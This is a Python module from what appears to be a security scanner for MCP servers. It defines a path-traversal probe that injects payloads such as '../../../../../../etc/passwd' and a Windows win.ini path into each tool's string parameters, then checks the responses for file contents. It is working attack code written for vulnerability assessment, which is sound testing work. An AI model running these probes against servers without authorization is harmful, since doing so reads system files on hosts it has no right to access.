"""Stage-2 attack: path-traversal probe.

Active attack. For each string parameter a tool exposes, invoke the tool with
directory-traversal payloads pointing at well-known host files and inspect the
response text for filesystem signatures.

Covers both POSIX (``/etc/passwd``) and Windows (``win.ini``) targets, so the
probe is meaningful regardless of where the server runs. Any *other* required
parameters are filled with benign placeholders (via
:func:`~mcp_strike.attacks._helpers.benign_args`) so the tool actually executes.

Tradeoffs:
- High precision: signatures are specific enough (e.g. ``root:x:0:0:``) that a
  match strongly implies the file was actually read, not echoed from the request.
- Recall is bounded to string parameters interpreted as filesystem paths.
"""

from __future__ import annotations

from typing import Any

from mcp_strike.attacks._helpers import benign_args, response_text
from mcp_strike.attacks.base import (
    AttackResult,
    BaseAttack,
    Stage,
    Verdict,
)
from mcp_strike.attacks.registry import register_attack
from mcp_strike.target import Target, ToolInfo

# Each probe is (payload, signature). The signature must be specific enough
# that its presence implies the real file was read. We cover both POSIX and
# Windows so a server is tested regardless of host OS; the wrong-OS payloads
# simply miss (the tool errors or returns nothing), costing one call each.
_TRAVERSAL_PROBES: tuple[tuple[str, str], ...] = (
    # POSIX: /etc/passwd always begins with the root account line.
    ("../../../../../../etc/passwd", "root:x:0:0:"),
    ("/etc/passwd", "root:x:0:0:"),
    # Windows: win.ini ships on every install with a "[fonts]" section header.
    ("..\\..\\..\\..\\..\\..\\Windows\\win.ini", "[fonts]"),
    ("C:\\Windows\\win.ini", "[fonts]"),
)


def _string_parameters(schema: dict[str, Any]) -> list[str]:
    """Return the names of all string-typed parameters in ``schema``.

    Looks at JSON Schema ``properties``. Returns an empty list if the schema
    has no string parameter (or no parsable structure at all).
    """
    props = schema.get("properties")
    if not isinstance(props, dict):
        return []
    return [
        name
        for name, spec in props.items()
        if isinstance(spec, dict) and spec.get("type") == "string"
    ]


@register_attack
class PathTraversalProbe(BaseAttack):
    """Probe every string parameter with directory-traversal payloads."""

    name = "path_traversal_probe"
    stage = Stage.PARAMETERS

    async def execute(self, target: Target) -> list[AttackResult]:
        results: list[AttackResult] = []
        for tool in await target.list_tools():
            result = await self._probe_one(tool, target)
            # Tools with no string parameter are silently skipped; they're
            # outside this attack's scope, not "uncertain" findings.
            if result is not None:
                results.append(result)
        return results

    async def _probe_one(
        self, tool: ToolInfo, target: Target
    ) -> AttackResult | None:
        """Probe a single tool. Returns None if it has no string parameter."""
        param_names = _string_parameters(tool.input_schema)
        if not param_names:
            return None

        # Fill any *other* required parameters with benign placeholders so the
        # tool runs; we then override the parameter under test with the
        # traversal payload. Falls back to just the payload when we can't build
        # a base (schema too exotic for benign_args).
        base_args = benign_args(tool.input_schema) or {}

        attempted: list[str] = []
        errored: list[str] = []

        for param_name in param_names:
            for payload, signature in _TRAVERSAL_PROBES:
                label = f"{param_name}={payload}"
                attempted.append(label)
                try:
                    call_result = await target.call_tool(
                        tool.name, {**base_args, param_name: payload}
                    )
                except Exception:
                    # The tool may reject the input, time out, etc. Don't let
                    # one bad probe abort the whole scan; keep trying.
                    errored.append(label)
                    continue

                text = response_text(call_result)
                # Case-insensitive: Windows file contents vary in casing.
                if signature.lower() in text.lower():
                    return AttackResult(
                        attack_name=self.name,
                        stage=self.stage,
                        target_tool=tool.name,
                        verdict=Verdict.SUCCESS,
                        rationale=(
                            f"Tool returned filesystem content when called "
                            f"with traversal payload {payload!r} on parameter "
                            f"{param_name!r}. Signature {signature!r} found in "
                            f"response."
                        ),
                        evidence={
                            "parameter": param_name,
                            "payload": payload,
                            "signature": signature,
                        },
                    )

        # No signature-bearing response. If *every* attempt raised, we don't
        # actually know whether the tool is vulnerable; escalate to UNCERTAIN
        # so a human can take a look.
        if errored and len(errored) == len(attempted):
            return AttackResult(
                attack_name=self.name,
                stage=self.stage,
                target_tool=tool.name,
                verdict=Verdict.UNCERTAIN,
                rationale=(
                    f"All {len(attempted)} traversal attempt(s) across "
                    f"parameter(s) {', '.join(repr(p) for p in param_names)} "
                    f"raised an error. Tool may reject all inputs by design, "
                    f"or may have a stricter validator."
                ),
                evidence={
                    "parameters": param_names,
                    "payloads_errored": errored,
                },
            )

        return AttackResult(
            attack_name=self.name,
            stage=self.stage,
            target_tool=tool.name,
            verdict=Verdict.FAILURE,
            rationale=(
                f"No traversal signature observed across {len(attempted)} "
                f"attempt(s) on parameter(s) "
                f"{', '.join(repr(p) for p in param_names)}."
            ),
            evidence={
                "parameters": param_names,
                "payloads_tried": attempted,
            },
        )
